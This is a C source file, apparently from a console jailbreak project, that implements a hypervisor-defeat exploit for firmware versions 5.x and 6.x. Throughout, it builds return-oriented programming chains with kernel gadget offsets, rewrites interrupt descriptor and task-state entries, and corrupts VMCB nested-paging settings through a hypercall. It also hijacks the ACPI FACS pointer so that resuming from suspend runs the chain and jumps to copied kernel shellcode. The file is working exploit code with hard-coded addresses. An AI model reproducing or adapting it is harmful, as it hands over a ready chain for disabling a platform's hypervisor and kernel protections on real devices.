#include "hv_defeat_0506.h"
#include "config.h"
#include "utils.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <stdio.h>

#define NESTED_CTRL_GMET_ENABLE 0x8

#define IPI_STOP 252

static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
  struct gate_descriptor ip = {};
  ip.gd_looffset = func;
  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  ip.gd_ist = ist;
  ip.gd_xx = 0;
  ip.gd_type = typ;
  ip.gd_dpl = dpl;
  ip.gd_p = 1;
  ip.gd_hioffset = func >> 16;
  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip,
         sizeof(ip));
}

static int get_vcpu(void) {
  if (fw >= 0x0500 && fw < 0x0600) {
    return 0;
  } else if (fw >= 0x0600 && fw < 0x0650) {
    return 1;
  }
  return -1;
}

static uint64_t get_hv_shm(void) {
  if (fw >= 0x0500 && fw < 0x0600) {
    return 0x62a01000;
  } else if (fw >= 0x0600 && fw < 0x0650) {
    return 0x62a22000;
  }
  return -1;
}

static uint64_t get_vmcb(int core) {
  if (fw >= 0x0500 && fw < 0x0600) {
    return (uint64_t)0x62a08000 + (uint64_t)core * 0x2000;
  } else if (fw >= 0x0600 && fw < 0x0650) {
    return (uint64_t)0x62a57000 + (uint64_t)core * 0x2000;
  }
  return -1;
}

static void build_gp_rop(uintptr_t ist, int vcpu, int tmr_id,
                         size_t shellcode_kernel_len) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  if (vcpu != 0) {
    // Send IPI to vcpu.
    *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
    *rop++ = 1 << vcpu;
    *rop++ = ktext + env_offset.FUN_STOP_CPUS;

    // Clear stopped_cpus.
    *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
    *rop++ = ktext + env_offset.STOPPED_CPUS;
    *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
    *rop++ = 0;
    *rop++ = ktext + env_offset.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
    *rop++ = 0xDEADBEEF;
  } else {
    // Corrupt NESTED_CTRL in vmcb via hv_unmap_pt_tmr hypercall.
    *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
    *rop++ = tmr_id;
    *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
    *rop++ = 0x1000;
    *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
    *rop++ = 0;
    *rop++ = ktext + env_offset.FUN_HV_UNMAP_PT_TMR;

    // Disable npt in all vmcb's.
    *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
    *rop++ = NESTED_CTRL_GMET_ENABLE;
    for (int i = 0; i < 16; i++) {
      *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
      *rop++ = pa_to_dmap(get_vmcb(i) + 0x90);
      *rop++ = ktext + env_offset.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
      *rop++ = 0xDEADBEEF;
    }
  }

  // Trigger vmmcall again to reload vmcb.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = 0;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = 0;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = 0xffffffffffffffff;
  *rop++ = ktext + env_offset.FUN_HV_UNMAP_PT_TMR;

  // Copy shellcode.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = kernel_cave_shellcode;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = shellcode_kernel_len;
  *rop++ = ktext + env_offset.FUN_MEMCPY;

  // Jump to shellcode.
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;

  kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

static void build_ipi_rop(uintptr_t ist, int vcpu, int tmr_id) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  // Corrupt NESTED_CTRL in vmcb via hv_unmap_pt_tmr hypercall.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = tmr_id;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = 0x1000;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = 0;
  *rop++ = ktext + env_offset.FUN_HV_UNMAP_PT_TMR;

  // Disable npt in all vmcb's.
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = NESTED_CTRL_GMET_ENABLE;
  for (int i = 0; i < 16; i++) {
    *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
    *rop++ = pa_to_dmap(get_vmcb(i) + 0x90);
    *rop++ = ktext + env_offset.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
    *rop++ = 0xDEADBEEF;
  }

  // Trigger vmmcall again to reload vmcb.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = 0;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = 0;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = 0xffffffffffffffff;
  *rop++ = ktext + env_offset.FUN_HV_UNMAP_PT_TMR;

  // Set stopped_cpus.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = ktext + env_offset.STOPPED_CPUS;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = 1 << vcpu;
  *rop++ = ktext + env_offset.GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;
  *rop++ = 0xDEADBEEF;

  // Call as_lapic_eoi.
  *rop++ = ktext + env_offset.FUN_AS_LAPIC_EOI;

  // Pivot to iretq.
  *rop++ = ktext + env_offset.GAD_POP_RSP_RET;
  *rop++ = ist + 0x00;

  kwrite64(ist + 0x00, ktext + env_offset.GAD_IRETQ);
  kwrite(ist + 0x30 + 0x08, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

int hv_defeat_0506(void *shellcode_kernel, size_t shellcode_kernel_len) {
  // hvm_shm + tmr_id * 0x18 + 0x298 = vmcb0 + vcpu * 0x2000 + 0x90
  // tmr_id = ((vmcb0 + vcpu * 0x2000 + 0x90) - (hvm_shm + 0x298)) / 0x18
  int vcpu = get_vcpu();
  int tmr_id = (get_vmcb(vcpu) - get_hv_shm() - 0x208) / 0x18;

  uintptr_t ist_gp = pa_to_dmap(alloc_page());
  build_gp_rop(ist_gp, vcpu, tmr_id, shellcode_kernel_len);
  kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
               offsetof(struct amd64tss, tss_ist6),
           ist_gp + 0x1000);
  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
         SEL_KPL, 6);

  if (vcpu != 0) {
    uintptr_t ist_ipi = pa_to_dmap(alloc_page());
    build_ipi_rop(ist_ipi, vcpu, tmr_id);
    kwrite64(ktext + env_offset.COMMON_TSS + vcpu * sizeof(struct amd64tss) +
                 offsetof(struct amd64tss, tss_ist7),
             ist_ipi + 0x30);
    setidt(IPI_STOP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
           SEL_KPL, 7);
  }

  // During suspend, AcpiSetFirmwareWakingVector will corrupt its own pointer,
  // and during resume it will trigger #GP, thus executing our ROP chain.
  kwrite64(ktext + env_offset.ACPIGBL_FACS,
           ktext + env_offset.ACPIGBL_FACS - 8);

  return 0;
}
